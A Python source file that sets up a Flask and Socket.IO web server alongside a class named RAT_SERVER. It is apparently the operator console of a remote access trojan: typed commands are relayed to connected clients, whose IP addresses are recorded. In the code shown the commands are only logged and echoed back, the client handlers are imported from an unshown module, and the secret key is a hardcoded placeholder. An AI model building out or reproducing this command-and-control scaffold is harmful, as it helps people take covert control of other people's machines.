import logging
import threading
import json
import requests
from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
import socketio  # This is from the python-socketio package

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# Flask setup
app = Flask(__name__, static_folder='Website', template_folder='Website')
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/js/<path:path>')
def send_js(path):
    return send_from_directory('Website/js', path)

@app.route('/css/<path:path>')
def send_css(path):
    return send_from_directory('Website/css', path)

@app.route('/media/<path:path>')
def send_media(path):
    return send_from_directory('Website/media', path)

@app.route('/execute-command', methods=['POST'])
def execute_command():
    data = request.json
    command = data['command']
    logging.debug(f'Received command: {command}')
    response = {'status': 'success', 'message': f'Command {command} received'}
    socketio.emit('server-message', {'message': f'Executing command: {command}'})
    socketio.emit('client-command-response', response)
    return jsonify(response)

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    ip = request.remote_addr  # Get client IP address
    logging.debug(f'Client connected: {sid} from IP: {ip}')
    clients[sid] = ip
    emit('server-message', {'message': f'Client {sid} connected from {ip}'})

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in clients:
        del clients[sid]
    logging.debug(f'Client disconnected: {sid}')

@socketio.on('client-command')
def handle_client_command(data):
    command = data['command']
    logging.debug(f'Received command: {command}')
    emit('server-message', {'message': f'Executing command: {command}'})
    # Sending back a response to the client
    emit('client-command-response', {'status': 'success', 'message': f'Command {command} received'}, room=request.sid)

def run_flask():
    socketio.run(app, host='0.0.0.0', port=5000)

# RAT_SERVER class and other related functions
class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client_ip = None
        self.current_client_socket = None
        self.sio = socketio.Client()  # Using python-socketio's Client

        from event_handlers import setup_event_handlers
        setup_event_handlers(self)

    def set_current_client(self, client_ip, client_socket):
        self.current_client_ip = client_ip
        self.current_client_socket = client_socket

    def banner(self):
        print("RAT Server Banner")

    def result(self):
        pass  # Implement this method to handle command results

    def execute(self):
        self.banner()
        while True:
            command = input('Command >>  ')
            if not self.current_client_ip or not self.current_client_socket:
                print("No client connected.")
                continue
            result = self.send_command_to_flask_server(command)
            print(result)

    def send_command_to_flask_server(self, command):
        url = 'http://127.0.0.1:5000/execute-command'
        headers = {'Content-Type': 'application/json'}
        data = {'command': command}
        response = requests.post(url, headers=headers, data=json.dumps(data))
        return response.json()

if __name__ == "__main__":
    # Start the Flask server in a separate thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Start the RAT server
    server = RAT_SERVER('127.0.0.1', 5000)
    server.sio.connect('http://127.0.0.1:5000')
    server.execute()
